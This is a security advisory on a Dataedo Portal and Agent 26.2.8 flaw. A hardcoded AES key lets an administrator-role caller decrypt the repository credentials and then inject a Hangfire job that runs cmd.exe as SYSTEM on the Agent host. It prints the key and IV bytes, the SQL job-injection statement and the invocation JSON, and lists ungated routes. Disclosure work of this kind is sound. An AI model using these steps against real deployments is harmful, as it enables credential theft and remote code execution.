# Dataedo Portal 26.2.8 with Dataedo Agent 26.2.8 — Repository Connection-String Disclosure and Scheduler Job Injection (code execution as the Agent service identity)

Author: 0day Rubbish Research Team
Advisory: https://0day-rubbish.com/blog/dataedo-portal-repository-connection-string-scheduler-job-agent-rce
Repository: https://github.com/Exploit-Garbage/0day-Rubbish
Contact: disclosure@0day-rubbish.com

## 1. Overview

### Overview of the finding

Dataedo Portal exposes a single HTTP route that hands the repository database connection string to an authenticated caller: `GET /api/repository/connection-string`. The route is authorized — it is not anonymous, and that distinction governs the whole of this advisory — but the value it returns is not protected in any way that survives contact with the client. The handler calls `SimpleAES.GetEncrypted(defaultConnection.Value.ConnectionString)` at `Dataedo.Application:12793`, and `SimpleAES` is an AES-256-CBC construction whose 32-byte key and 16-byte initialization vector are hardcoded byte-array literals inside `Dataedo.Settings.dll` (`Dataedo.Settings:64-71` for the key, `Dataedo.Settings:72-77` for the IV) and are therefore public to anyone who owns a copy of the product. The ciphertext is a digit run — each byte rendered as a three-digit decimal group — so there is not even a container format to obscure it.

The consequence is that the confidentiality boundary around the repository database credentials ends at the HTTP response. A principal holding the repository-management role reads a 200 response carrying 528 decimal digits, which is 176 bytes, which is 11 AES blocks, decrypts it offline in microseconds, and holds the repository database login. In the tested deployments that login was `sa` — a sysadmin-level SQL Server principal. From there the attacker needs no further Portal interaction at all: the repository database contains the Hangfire scheduler storage in the `[Scheduler]` schema, and the Dataedo Agent — a separately installed Windows component of the same product line — polls that schema as a Hangfire server with two workers and no type restriction whatsoever. Writing one row into `[Scheduler].Job` and one row into `[Scheduler].JobQueue` causes the Agent to resolve an attacker-chosen .NET type from stored JSON and invoke an attacker-chosen static method on it. `Process.Start("cmd.exe", "/c ...")` is the obvious choice and the one that was verified end to end, landing a marker file on the Agent host under the identity of the Agent process, which in the verified shape was `nt authority\system`.

This is a chain that crosses three trust boundaries and two machines, and it is a chain that begins with an authenticated administrator-role principal. Both halves of that sentence matter. The privilege requirement is proven (a zero-permission SQL login was refused a session with HTTP 400 `ACCESS_WITHOUT_ANY_PERMISSIONS`), and the deployment preconditions that separate the anonymous primitives from the execution outcome are documented in full in section 3 and section 10 because an earlier reading of this research claimed zero-click anonymous reachability and that claim was refuted.

### Overview of the product and its runtime stack

Dataedo is an enterprise data-catalog and data-governance platform from Dataedo sp. z o.o., Poland. It maps metadata from downstream data sources — SQL Server, PostgreSQL, Oracle, Athena, QuickSight and dozens of others — into a central catalog with lineage, data-quality rules, glossaries and reporting. The tested build is 26.2.8 for both components.

The runtime stack is ASP.NET Core targeting `net9.0`:

- **Dataedo Portal** — the web application. Ships in three deployment shapes: IIS with the ASP.NET Core Module v2 in-process, a Linux container (Kestrel; the vendor documents docker-compose and ships a marketplace image), and a Windows service shape. A single-page front end is served from `wwwroot`. Persistence lives in a "repository" database, either Microsoft SQL Server or PostgreSQL.
- **Dataedo Agent** — a `win-x64`-only ASP.NET Core host installed as a Windows service via `AddWindowsService`. It carries the connectors that actually talk to downstream data sources, an SSH tunnel capability, and two Hangfire server workers that consume jobs from the repository database. It cannot run on Linux: the Windows-flavored `Microsoft.Data.SqlClient` throws a `NullReferenceException` at `ADP.LocalMachineRegistryValue` inside a Linux container, which is how the platform exclusivity was established.
- **Repository database** — the single trust anchor of the product. Users and licenses (`licenses`, `user_details`), permissions (`permissions`), data-source credentials (`credentials`, `ssh_configurations`), single-sign-on configuration (`sso_configurations`), login-method switches and public-API switches (`configuration`, including `API_STATUS`, `API_TOKEN`, `WEB_CATALOG_URL`), one-time login codes (`login_access_codes`), sessions, and the Hangfire `[Scheduler]` schema all live in the same database.
- **Scheduler** — Hangfire, with the Portal in the client role (enqueue) and the Agent in the server role (fetch and execute). This split is the structural reason a database write becomes host execution.

Request pipeline order, read out of `StartupBase.Configure`: `DoubledApiPrefixRewrite` → rate limiter → OpenAPI documents → CORS → HTTPS redirection → exception and header handling → `UseAuthentication` → `UseAuthorization` → activity log → `RepositoryCompatibilityMiddleware` (with its `ignoredUrls` allowlist) → `UserLicenseKeyMiddleware` → `InitializeMiddleware` → endpoints. Command handling runs through a MediatR pipeline ordered `ValidationBehavior` → `PermissionBehavior` → `LoggingBehavior` → handler (`Dataedo.Application:1271`), and `PermissionBehavior` (`Dataedo.Application:70566`) resolves a `PermissionAuthorizer<T>` from the container and, when none is registered, immediately calls `next()`. That single line is the reason most of this product's authorization decisions live in per-command authorizer registrations rather than in the framework's authorization middleware, and it is why status-code differencing alone misclassifies the surface (section 4).

### Overview of the testbed and of what that implies

Both components were tested as the vendor's own binaries. The Portal installer is a .NET 9 single-file bundle (`Dataedo_Portal_26.2.8_setup.exe`, 622,898,392 bytes, SHA256 prefix `75b601aa...41a4e`) containing a WPF and DevExpress WinForms wizard; running it self-extracts to `%TEMP%\.net\...` and lands only eight native DLLs on disk, so the managed payloads never appear as files and off-the-shelf decompilers report "no managed metadata". The bundle was therefore parsed by hand: the Authenticode certificate table sits at file offset 622,883,512 — appended after the bundle, which is why the manifest is not at end-of-file — and each entry record is `[u64 absolute offset][u64 size][u64 extra = 0][u8 type (1 = assembly, 2 = native, 3 = deps, 4 = rtconfig)][7-bit-length-prefixed path]`. There is no central directory. All 613 entries validated against MZ or JSON content checks. One entry, a 124 MB installer module, embeds a streaming zip with 2,726 `PK\x03\x04` local headers, three pseudo-end-of-central-directory signatures and flag bit 3 set (data descriptors follow the payload), which was extracted with a streaming unzipper driven by `zlib.decompressobj().unused_data`, yielding 2,600 product files totalling 306 MB — including `Dataedo.Api.dll` with a complete PDB, `appsettings.json`, `web.config` and `wwwroot`. The Agent installer (SHA256 prefix `38111c21...3973`) was processed the same way: 583 bundle entries, a 146 MB nested installer module, 539 extracted files including `Dataedo.Agent.exe` and the scheduler family. Roughly 5,600 decompiled C# files were produced in total: 541 for the API layer, 4,759 for the application layer, plus the auth, repository, scheduler, agent and settings assemblies.

The Portal ran as `dotnet Dataedo.Api.dll --protocol https --port 8443` inside an `aspnet:9.0` container on a private container network with Production environment settings, reachable only from that network, with a self-signed Kestrel certificate. The protocol and port are command-line overridable because `Program.cs` reads `configuration.GetValue("protocol","https")`. The repository database was SQL Server 2022 in a sibling container. The Agent ran on Windows Server 2025 as a SYSTEM-privileged scheduled task, with `rollForward = Major` in its `runtimeconfig` so that the `net9.0` application would load on the installed .NET 10 runtime, and with its repository database migrated by BACKUP and RESTORE (a 2.6 MB backup file) from the container host onto local SQL Express listening on port 1433. The Agent's own HTTP listener was bound to `http://[::]:15999` for the duration of testing.

Two implications of that shape must be stated up front, because they bound every claim that follows. First, the Portal was run directly from the extracted product binaries rather than through the vendor's install wizard, so anything the wizard itself configures — notably the randomization step that writes a fresh `TokensKey` during its "Configuring API" phase — was not applied to our instance. Where a finding depends on a factory default surviving, the deployment shapes in which it survives are enumerated rather than assumed. Second, one configuration detail in the testbed is a property of the product, not of the lab: supplying the connection string in plaintext through the environment variable poisons startup, because `DefaultConnection` accepts only the SimpleAES digit-run ciphertext and `GetDecrypted` swallows failures into null. The secret therefore lives in the configuration file, encrypted with a key that ships in the binary. That is the design, and it is the root of the confidentiality failure in this chain.

Third-party attacker-controlled SQL Server instances were stood up for the adjacent window-state testing; every credential shown here belongs to those lab instances and is redacted regardless.

### Overview of affected scope

In scope, because the chain crosses from one to the other:

- Dataedo Portal 26.2.8 — the component that discloses the ciphertext and that owns the missing authorization model.
- Dataedo Agent 26.2.8 — the component that converts a repository database write into operating-system command execution.

The repository database (SQL Server or PostgreSQL) is not itself defective; it is the trust boundary that the Agent treats as authoritative input, so it is named as the medium rather than as an affected product.

A newer Portal build, version 26.3.0, was also obtained and exercised during this research: 643,279,488 bytes, targeting `net10.0`, with a bundle of 624 entries and a product archive of 2,550 files. On that build the same endpoint returned ciphertext under the same conditions, the same static AES key bytes were confirmed present by a byte-level search of its `Dataedo.Settings.dll`, the factory `TokensKey` GUID was unchanged, the unauthenticated differential matrix agreed (`/api/repository/host-environment` 200, `/api/users` 401, `/api/repository/connection-string` 401), and anonymous window-state repository registration produced 263 migrated tables in 72 seconds followed by first-user takeover. The Agent binary was **not** re-executed against that build, so the execution segment on the newer build is argued from the absence of any change signal in its bundle structure, not verified. This advisory claims 26.2.8 for both components and reports the newer build as a corroborating observation of the same construction.

### Overview of independence

This is original work, not a re-published public issue. A keyword search of the United States National Vulnerability Database for the vendor name returned `totalResults=0` at the time this work was performed: no prior public vulnerability record existed for this product. A search of public exploit archives for the vendor name and for the distinctive endpoint segment returned nothing. A cross-check across the product line's other naming variants — a server-labelled static-only pass over the same Portal code base, and the vendor's WPF and command-line client products, which expose no server-side listener — established that the earlier passes had never examined the Agent component, which is where the operating-system execution primitive lives. That gap, not a new technique, is why this chain was found after a prior static-only pass over the Portal had concluded that no execution sink existed anywhere in the product (a conclusion that is still correct for the Portal process, and is documented in section 5).

The closest prior art in the ecosystem is CVE-2021-41238, which concerns the Hangfire dashboard's missing authentication. It is a different class of defect on three counts: the dashboard here is gated to the Development environment and is not part of this chain; the vector here is a row injected into the storage schema rather than an HTTP request to a dashboard route; and the root cause here is the Dataedo-specific absence of a server-side invocation-type restriction combined with an authorization model that leaks the storage credentials. The novelty is the combination — an unauthenticated network primitive that installs an attacker-selected repository, zero server-side type filtering, and a permissive type resolver — not the scheduler library's own behaviour.

## 2. Vulnerability Summary

### Vulnerability Summary table

| Attribute | Value |
|---|---|
| Product | Dataedo Portal 26.2.8 and Dataedo Agent 26.2.8 |
| Vendor | Dataedo sp. z o.o. (Poland) |
| Vulnerable component | Portal: `GetConnectionStringQueryHandler` / `Dataedo.Settings.Cryptography.SimpleAES`. Agent: `AgentServiceRegistration.AddScheduler` Hangfire server configuration |
| Vulnerability class | Deserialization of untrusted data by unrestricted invocation-type resolution (CWE-502), enabled by insufficiently protected credentials under a hard-coded cryptographic key (CWE-522, CWE-321) |
| Entry route | `GET /api/repository/connection-string` — authenticated, requires a repository-management role (`RoleAction = 11`) |
| Execution route | `INSERT` into `[Scheduler].Job` and `[Scheduler].JobQueue` in the repository database; consumed by an Agent worker |
| Sink | `Process.Start(string, string)` reached through Hangfire `InvocationData` type resolution on the Agent host |
| Authentication | **Required.** Administrator-role principal (role action 11 or above). Not anonymous, not zero-click |
| Preconditions | (1) a valid repository-management principal; (2) the static SimpleAES key, public in the shipped assembly; (3) network reachability to the repository database; (4) a Dataedo Agent attached to that repository. Conditions (3) and (4) are deployment-induced and are the reason Attack Complexity is scored High |
| Impact | Arbitrary command execution on the Agent host as the Agent process identity |
| Observed identity | `nt authority\system` in the SYSTEM-scheduled verification shape; `<agent-host>\administrator` in the console-launched shape |
| CVSS 3.1 published | 8.1 High — `CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H` |
| Adjacent disclosure group | Published inside this advisory, scored separately, never folded into the 8.1: unauthenticated repository-management surface (18 routes), permanent anonymous `WEB_CATALOG_URL` tamper and SSRF, permissive CORS with credentials, factory JWT signing key with issuer and audience validation disabled |
| Prior public record | None found for this product at the time of research |

### Vulnerability Summary mechanics

The mechanics are four discrete steps, each independently observed.

Step one is a disclosure, not a bypass. The route works exactly as designed: it returns the repository connection string to a caller who holds the repository-management role. The defect is that the value is returned in an encrypted form whose key is a byte-array literal in `Dataedo.Settings.dll`, so the encryption transports nothing and protects nothing. The key and the IV, both recovered from the shipped assembly and reproduced in the published proof-of-concept, are:

```
key[32] = {54,25,27,22,2,56,99,44,113,144,217,45,67,146,141,222,55,44,12,54,165,21,22,34,32,221,64,121,123,211,122,29}
IV[16]  = {186,23,211,33,132,87,135,121,99,120,66,36,122,234,114,142}
algorithm: RijndaelManaged, AES-256-CBC, PKCS7 padding
encoding: ByteArrToString, every ciphertext byte as a 3-digit decimal group
```

The same static pair is used for the Portal's own `DefaultConnection:ConnectionString`, for the Agent's `ConnectionStrings:Dataedo` entry (decrypted through `GetDecryptedRepositoryConnectionString`), for `SSH:SSHPassword` — which the Agent's `SSHPasswordMigrator` encrypts in place when it finds plaintext — for `SMTP:Password`, for `Saml2:SigningCertificatePassword`, and for the `credentials` and `ssh_configurations` table families in the repository. In the static inventory it is referenced from 12 assemblies (Shared, Settings, Repository, Migrations.SqlServer, Migrations.PostgreSql, the CodeMigrations range, Application, Api); a later full census counted 19 assemblies, adding SSH private-key mappers and connector secrets inside migrations. `GenerateEncryptionKey()` exists at `Dataedo.Settings:116` and no call path was found that replaces the static field with its output.

Step two is offline credential recovery. The response body is a digit run. 528 digits decode to 176 bytes, an exact multiple of the 16-byte block size, and after PKCS7 unpadding yield the connection string:

```
Data Source=<repository-db-host>;Initial Catalog=<repository-db>;Integrated Security=False;User ID=sa;Password=<PASSWORD>;Trust Server Certificate=True;Authentication=SqlPassword
```

The recovered login is `sa`. That is a sysadmin-level principal on the repository database, which is where the catalog stores every other secret in the product.

Step three is the write. The Hangfire storage tables live in the `[Scheduler]` schema of that same database:

```sql
SET NOCOUNT ON;
SET QUOTED_IDENTIFIER ON;
DECLARE @jid BIGINT;
INSERT INTO [Scheduler].Job (StateName, InvocationData, Arguments, CreatedAt)
VALUES ('Enqueued', N'{"Type":"System.Diagnostics.Process, System.Diagnostics.Process",
   "Method":"Start",
   "ParameterTypes":"[\"System.String\",\"System.String\"]",
   "Arguments":"[\"cmd.exe\",\"/c <payload>\"]"}',
   N'["cmd.exe","/c <payload>"]', SYSUTCDATETIME());
SET @jid = SCOPE_IDENTITY();
INSERT INTO [Scheduler].JobQueue (JobId, Queue, FetchedAt) VALUES (@jid, 'default', NULL);
SELECT @jid AS injected_job_id;
```

Three details are load-bearing and none of them is obvious. The `Arguments` column and the `InvocationData.Arguments` member must both be written, and the latter is a JSON string nested inside a JSON string, so the escaping is two layers deep. `QUOTED_IDENTIFIER` must be ON — the scheduler schema uses filtered indexes, which is why the recorded runs drove the client with the `-I` switch. And the row must be paired with a `[Scheduler].JobQueue` entry naming a queue the Agent actually polls, otherwise the job exists but is never fetched.

Step four is the consumption. The Agent's two workers fetch from the repository, deserialize `InvocationData`, resolve `Type` through the default type resolver, and invoke `Method` with the deserialized arguments. No allowlist, no namespace check, no declaring-type filter is consulted at execution time.

### Vulnerability Summary preconditions

The preconditions are the part of this finding that a headline can most easily misrepresent, so they are stated with the same prominence as the impact.

1. **An authenticated repository-management principal.** `GetConnectionStringQueryAuthorizer` is `Require().Role(RoleAction = 11)` (`Dataedo.Application:12782`). The route carries `[Authorize]` but no `AdminAttribute`; the gate is a role check inside the MediatR permission behaviour. A SQL login with zero application permissions was refused outright: `POST /api/auth/login` returned HTTP 400 with `ACCESS_WITHOUT_ANY_PERMISSIONS` at the `HasWebAccess` gate and no session was issued. So the least privileged principal demonstrated is a role-action-11 holder, and the claim "any authenticated user can do this" is explicitly not made.
2. **The static key.** It is public in the shipped assembly and byte-identical across builds, so this precondition is always satisfied for anyone who has downloaded the product. It is a precondition in the logical sense only.
3. **Network reachability to the repository database.** Not guaranteed by the product. In our container lab the database was bound to loopback; in a typical enterprise Windows deployment the repository sits on a database server reachable from the Portal and Agent hosts and often from the same network segment as administrators. Where the caller already holds `sa` credentials recovered in step two, the only remaining question is routing.
4. **A Dataedo Agent attached to that repository.** The Agent is a separate installation. A Portal with no Agent attached has scheduler storage that nobody consumes, and the write produces a row that never executes. This is a deployment-topology condition entirely outside the attacker's control, and it is the single reason Attack Complexity is scored High rather than Low in the published vector.

None of these preconditions involve user interaction, and none of them can be satisfied by an anonymous party over HTTP alone. Section 10 answers the unauthenticated question at length, including the specific claim that was withdrawn and the reverse-engineering evidence that withdrew it.

## 3. Authentication Boundary

### Authentication Boundary — how sessions are issued

The product supports five authentication schemes and a validator matrix, and there is no product-specific password store: every local login method delegates to an external validator.

- **Cookie** — the web portal scheme. Session cookies are produced by ASP.NET Core Data Protection with a per-installation random key, so they cannot be forged offline; this was confirmed in an earlier pass and nothing in the current work contradicts it. `CustomCookieAuthenticationEvents.ValidatePrincipal` re-reads the principal's session identifier, user identifier and login from the repository's `sessions` table, filtering on `Product == "WEB"` and a valid status, and signs the principal out when the row is missing. The cookie is issued as `HttpOnly` with `Secure` and, in the shipped configuration, `SameSite=None` with `SecurePolicy=Always`.
- **Personal access token** — for programmatic clients.
- **JWT bearer** — HMAC-SHA256 over the `TokensKey` from configuration. A `ForwardDefaultSelector` restricts this scheme to `/public/v1`, so the cookie and PAT schemes guard `/api/*`. This is a correction to an earlier, wider reading of the JWT surface.
- **SAML 2.0** via a third-party library, **OIDC**, **Active Directory** and **LocalWindows** — all configured from the repository database, i.e. from data the repository owner controls.

Login itself is `POST /api/auth/login`, anonymous and rate-limited by a login policy, carrying `{login, password, loginMethod, userAgent}`. The `loginMethod` integer selects the validator. Method 0 selects `SqlServerUserValidator.CheckIfValidSqlServerCredentials`, which opens a connection to the configured `DefaultConnection` and runs `SELECT TOP(1) 1 FROM [version]` using the submitted credentials. Method 7 selects one-time access codes stored in `login_access_codes`.

### Authentication Boundary — what the gate actually checks

For the counted chain the relevant gate is narrow and specific. `GetConnectionStringQueryAuthorizer` at `Dataedo.Application:12782` is:

```
Require().Role(RoleAction = 11)
```

That is a repository-management role action, one of the enumerated `RoleAction` values in `Dataedo.Repository.EntityFrameworkModel.Models.Enums.RoleActionType+RoleAction`. It is enforced through the MediatR `PermissionBehavior` rather than through an MVC attribute, which has a practical consequence for anyone probing this surface: `PermissionBehavior` runs **after** `ValidationBehavior` (`Dataedo.Application:1271`), so a malformed request produces HTTP 400 from the validator before any authorization decision is made. A 400 is therefore not evidence of a gate, and a 401 or 403 is. The dynamic classification rule used throughout this work was exactly that: 401/403 means gated; 200, 400, handler-generated 404 and 500 mean the handler ran.

`PermissionBehavior` itself (`Dataedo.Application:70566`) resolves `PermissionAuthorizer<T>` from the container and calls `next()` when the resolution returns null. So the default posture for any command without a registered authorizer is permissive, and the security of the entire surface depends on every sensitive command having registered one. `GetConnectionStringQuery` did. Most of the repository-management commands did not (section 4).

The two-sided empirical evidence for the gate:

- An all-roles first user in the verification environment — a principal that had just been granted every role — received HTTP 200 and 528 digits of ciphertext.
- A second SQL login with no application permissions received HTTP 400 `ACCESS_WITHOUT_ANY_PERMISSIONS` and no cookie.

On the newer build, an entirely unauthenticated request to the same path returned HTTP 401 while `/api/repository/host-environment` returned HTTP 200 and `/api/users` returned HTTP 401, which places `connection-string` firmly on the authenticated side of the differential.

### Authentication Boundary — the principal required by the sink

The sink does not care who wrote the row. The Agent authenticates to the repository database with the connection string in its own `appsettings.json` and consumes whatever is in `[Scheduler].JobQueue` for the queues it polls — in the tested shape, `default` with one worker and `priority`. There is no notion of a job owner, no per-job authorization, and no signature over `InvocationData`. The authorization decision for the execution segment is entirely "does the writer hold credentials able to insert into these two tables".

That is why the practical principal for this chain is: a repository-management role holder on the Portal (to recover the credential) *or* anyone who already has write access to the `[Scheduler]` schema by other means (a low-privileged SQL login, an SQL injection elsewhere, or credentials recovered from an installer-produced `Dataedo-Web-backup-*.zip` archive and decrypted with the same static key). Only the first of these was demonstrated end to end and only the first is scored.

### Authentication Boundary — what is deliberately not claimed

Four claims are explicitly not made.

**Not claimed: anonymous reachability of the connection-string route.** It returns 401 unauthenticated. The route is one of exactly three `/api/repository` operations that carry a method-level authorizer — `permissions`, `info` and `connection-string` — which is precisely why the counted chain starts post-authentication while the adjacent group in section 4 starts pre-authentication.

**Not claimed: anonymous reachability of the Agent write.** There is no HTTP path from an unauthenticated party to `[Scheduler].Job`. The three bridges that exist all require a deployment-induced condition and are catalogued in section 10.

**Not claimed: that a Portal repository switch moves an already-installed Agent.** This was asserted in an earlier draft of the analysis and refuted on re-review: the Agent reads its repository connection string from its own configuration file at `Dataedo.Agent.Startup/ServicesConfigurator.cs:43` and exposes no controller and no remote-configuration endpoint of any kind. Re-pointing the Portal therefore does not re-point the Agent. That refutation is the reason this advisory is post-authentication rather than zero-click, and it is repeated here because it is the single most important accuracy statement in the document.

**Not claimed: that a healthy, already-configured instance can be silently switched to a second repository.** `POST /api/repository/set` answers 409 with an explicit "already configured" message and `create-on-existing-database` reports `RepositoryAlreadyConfiguredException` through `lastOperation.error`. The validator's `IsConfigured` gate was verified by experiment. An earlier sub-claim that a second hijack of a running instance was demonstrated was withdrawn: the endpoint returns 202 as a fire-and-forget acknowledgement and carries no information about whether the switch actually happened, and the subsequent state read showed the configured repository unchanged.


## 4. Attack Surface

### Attack Surface — listeners, routes and their protection

The Portal listens on one HTTP(S) endpoint per deployment shape: Kestrel directly (container, or `dotnet Dataedo.Api.dll --protocol https --port 44345`-style invocations), or in-process behind IIS with the ASP.NET Core Module v2. The Agent listens on its own HTTP endpoint — a configured port or an ephemeral one in the 5000-65535 range — and, in the tested shape, that listener was bound to `http://[::]:15999`; all address families are bound, so the listener is not loopback-restricted by default. The Agent's Hangfire dashboard route `/scheduler` is registered only when the environment is Development, so it is not part of this chain.

Two OpenAPI documents are served by the Portal, and in the tested build both were reachable anonymously in Production: a public document describing `/public/v1` with 118 paths and 130 operations, and an internal document with 1,271 paths and 1,288 operations. There is no environment gate around them in `StartupBase.Configure`. The absence of a `security` field on the internal document's entries does **not** imply those routes are anonymous — that was tested and corrected during this work, and the authoritative classification comes from the attribute census plus dynamic status differencing, not from the document.

Four SignalR hubs are registered: `/notificationhub`, `/aidescriptionshub`, `/schedulerhub`, `/agentstatushub`. Their negotiate-phase authentication handling was not exercised, and they are listed as unmapped surface rather than as cleared surface.

### Attack Surface — how the surface was mapped

Three independent enumerations were cross-checked.

**Symbol enumeration from the decompiled backend**, which is the authoritative source because ASP.NET Core routing here is entirely attribute-driven with no dynamic route registration: 1,353 endpoint attributes across 217 controllers — 836 `[HttpGet]`, 515 `[HttpPost]`, 2 `[HttpDelete]`.

**Runtime enumeration from the two anonymously reachable OpenAPI documents**: 118 public paths plus 1,271 internal paths, as above.

**Dynamic differencing** against a live instance: for each candidate route, an unauthenticated request was issued and the status was classified. 401 and 403 mean an authentication or authorization gate fired. 200, 400, handler-level 404 and 500 mean the handler executed, because the MediatR pipeline puts `ValidationBehavior` before `PermissionBehavior` — a 400 from a validator proves reachability of the pipeline, not permission.

The class-level authorization census over the 217 controllers is the single most useful number in this section:

| Class-level attribute | Controllers | Names |
|---|---|---|
| `[Authorize]` present | 205 | — |
| No authorization attribute | 10 | `Auth`, `Connectors`, `Credentials`, `Licenses`, `Platform`, `ProfilingSettings`, `Repository`, `Scheduler`, `SchedulerRequests`, `TextEditor` |
| `[AllowAnonymous]` | 2 | `OAuth2`, `LoginAccessCodes` |

Those ten unprotected controllers do not automatically produce unprotected routes, because individual actions can carry their own `[Authorize]` and because per-command authorizers exist in the MediatR layer. But the combination of an unprotected controller, an unprotected action and an unregistered `PermissionAuthorizer<T>` yields a route that runs its handler for anyone, and that is the state of the repository-management surface.

Concretely, `RepositoryController` is registered at `api/[controller]` and exposes 16 operations, of which exactly three carry method-level authorization: `permissions`, `info` and `connection-string`. The remaining 13 do not, and the five `postgres-repository` family routes are in the same condition, giving 18 ungated repository-management routes. `RepositoryCompatibilityMiddleware` maintains an `ignoredUrls` allowlist of 17 entries that passes those paths unconditionally — the middleware performs repository version-compatibility checks and returns HTTP 426 while the repository is unconfigured, but it performs no authorization whatsoever. And there is no global fallback: a source-wide search for `FallbackPolicy`, `AuthorizeFilter` and `RequireAuthenticatedUser` returned zero hits, so a missing attribute is not compensated by a default policy. The surface fails open by construction.

The first enumeration classified 32 endpoints as unauthenticated-reachable: 22 explicit `[AllowAnonymous]` or inherited endpoints, plus 10 endpoints in the unprotected controllers that had no registered authorizer. The remaining endpoints in those controllers — `TestConnection`, `AddCredential`, `PerformOneTimeJob`, `TriggerTask` among them — were confirmed gated because a well-formed anonymous request produced 403. After the repository write surface was correctly characterized, the unauthenticated count was revised upward to approximately 45. The revision is itself a finding about method: the repository routes had been dismissed as install-wizard endpoints, and dynamic testing disproved that on a running instance, where `POST /api/repository/connect-and-upgrade` returns HTTP 202 at any time.

The ungated repository routes, with observed unauthenticated status:

| Method | Route | Unauthenticated | Note |
|---|---|---|---|
| GET | `/api/repository` | 200 | repository state plus `lastOperation`, which acts as an anonymous error oracle |
| POST | `/api/repository` | 202 | asynchronous creation with full migrations |
| POST | `/api/repository/create-on-existing-database` | 202 in a window state, 409 when configured | primary write primitive |
| POST | `/api/repository/set` | 409 "already configured"; 200 against a pre-built valid repository | validator answerable by pre-creating the schema |
| POST | `/api/repository/connect-and-upgrade` | 202 on a running instance | catches `RepositoryAlreadyConfiguredException` and continues |
| POST | `/api/repository/upgrade` | reverse-engineered | repository schema upgrade with supplied credentials |
| POST | `/api/repository/available-databases` | 400 at the validator | outbound TDS connection to an attacker-named host |
| POST | `/api/repository/is-dbo-default-schema` | 400 at the validator | same outbound family |
| GET | `/api/repository/database-update-log` | 500 with full stack trace | exception detail disclosure |
| GET | `/api/repository/ping` | reverse-engineered | liveness |
| GET | `/api/repository/host-environment` | 200 `{"isDocker":false}` | deployment-shape fingerprint |
| GET | `/api/repository/identity` | 500 in a container; leaks the service account on Windows | `WindowsIdentity.GetCurrent().Name` |
| GET | `/api/repository/code-migration-errors` | reverse-engineered | migration failure detail |
| POST | `/api/postgres-repository` and `/set`, `/create-on-existing-database`, `/connect-and-upgrade`, `/upgrade` | reverse-engineered, 5 routes | PostgreSQL family, same construction |
| GET | `/api/repository/connection-string` | **401** | authorized; `RoleAction = 11` — the entry point of the counted chain |
| GET | `/api/repository/info`, GET `/api/repository/permissions` | 401 | authorized |

### Attack Surface — components that narrow the surface

Several things that look like weakness are in fact boundaries, and they are recorded here so that the map is not read as uniformly permissive.

`DoubledApiPrefixRewrite` rewrites `/api/api/...` to `/api/...`. It sits **before** `UseRouting`, so it is a pure client-compatibility shim and not an authentication/URI mismatch: `/api/api/repository/ping` returns 200 exactly as `/api/repository/ping` does, and no route is reachable through it that is not reachable directly.

Cookie authentication cannot be forged offline: the Data Protection key is per-installation random.

The license-file deserialization path uses `TypeNameHandling.All`, but `VerifySignature` runs first and validates an RSA-PSS SHA-256 signature against two vendor public keys held in a hardcoded `PublicKeyStore`, so an attacker cannot supply a malicious `$type` without the vendor's private key.

The internal API's sensitive write endpoints on other controllers are gated by real authorizers: `POST /api/connections/test-connection/{id}` and `POST /api/credentials/add` are behind a connections-management authorizer plus a license check, `POST /api/scheduler/perform-one-time-job` behind a license plus connections-management authorizer, and `POST /api/scheduler/tasks/{id}/trigger` behind a license gate. Each was probed with a well-formed anonymous body and returned 403.

The Hangfire dashboard is Development-only. The JWT scheme is confined to `/public/v1` by `ForwardDefaultSelector`. The Agent exposes no HTTP configuration surface at all. And the repository database is not an HTTP component: reaching it means speaking TDS to a database listener, which is a network-position precondition rather than a web vulnerability.

## 5. Sink Identification

### Sink Identification — how the sink was found

An earlier static pass over the Portal concluded, correctly, that no execution primitive exists in that process. A global primitive search across 23 assemblies and roughly 190,000 lines — 50 decompiled files — returned zero hits for `Process.Start`, `System.Diagnostics.Process`, `ProcessStartInfo`, `CSharpCodeProvider`, `CSharpScript`, Roslyn scripting, `Assembly.Load`, `LoadFrom`, `LoadFile`, `XslCompiledTransform`, `XslTransform`, `BinaryFormatter`, `SoapFormatter`, `NetDataContractSerializer`, `JavaScriptSerializer`, `DataTable.Compute`, `DataColumn.Expression`, `System.Linq.Dynamic`, `DynamicExpression`, non-`None` `TypeNameHandling`, `XmlSerializer` with a user-controlled type, and Semantic Kernel plugin registration (`RegisterPlugin`, `ImportPlugin`, `KernelFunction`, `CreateFunctionFromPrompt`). The conclusion drawn at the time — that the product is a metadata catalog rather than a script runner, and that no authenticated RCE sink exists — was right about the Portal and wrong about the product line, because the audit scope stopped at the Portal process.

The execution primitive is in the Agent, which is a separate shipped binary. The sink was therefore found by widening scope from "the web application" to "every component that consumes the repository database", and then following the only cross-process channel that repository shares with another executable: Hangfire storage. The Agent registers two Hangfire servers against that storage. A Hangfire server deserializes the `InvocationData` JSON of whatever job row it fetches and invokes the named method. That deserialization-plus-invocation is the sink, and it is a sink by design — the question is whether the design constrains which types may be named. It does not.

### Sink Identification — the vulnerable construction

`AgentServiceRegistration.AddScheduler` calls `AddHangfireServer` twice, once for the `default` queue with a worker count of 1 and once for the `priority` queue, and registers no `ITypeResolver` restriction and no invocation allowlist with either. Hangfire's default type resolver will resolve any type name that the runtime can load.

`FilterInitializer` then runs `GlobalJobFilters.Clear()` and adds four filters. Each was read to determine whether any of them constrains execution:

- `ExecutionCreatingFilter` and `RequestUpdatingFilter` are `IClientFilter` implementations, which run on the **client-side job creation path**, not on server-side execution. Both additionally return early unless the declaring type implements `ISchedulerTaskExecutor`.
- `JobCancellationFilter` is an `IApplyStateFilter` that reacts only to transitions into `DeletedState`.
- `AutomaticRetry` is configured with `Attempts = 0`, which disables retries and has no bearing on authorization.

So after `Clear()`, no filter in the chain inspects the invocation type, the declaring type, the method name or the arguments at execution time. The server executes whatever the storage says. Combined with the fact that the storage credentials are recoverable from an HTTP response, the scheduler database is a remote code execution interface for anyone who can write two rows.

The invocation document the worker deserializes is the standard Hangfire shape, which is why the injection needs no gadget chain at all:

```json
{
  "Type": "System.Diagnostics.Process, System.Diagnostics.Process",
  "Method": "Start",
  "ParameterTypes": "[\"System.String\",\"System.String\"]",
  "Arguments": "[\"cmd.exe\",\"/c <payload>\"]"
}
```

### Sink Identification — execution identity of the child process

The child process inherits the identity of the Agent process. Two shapes were observed, and both are recorded because they bound the claim:

- Agent launched from a console under an interactive administrative account: `whoami` in the marker file returned `<agent-host>\administrator`.
- Agent run resident as a SYSTEM-privileged scheduled task: `whoami` returned `nt authority\system`. A `tasklist` filter on PID 4 appended to the same file showed the System process with session identifier 0 and a Services session name, consistent with a service-context execution environment.

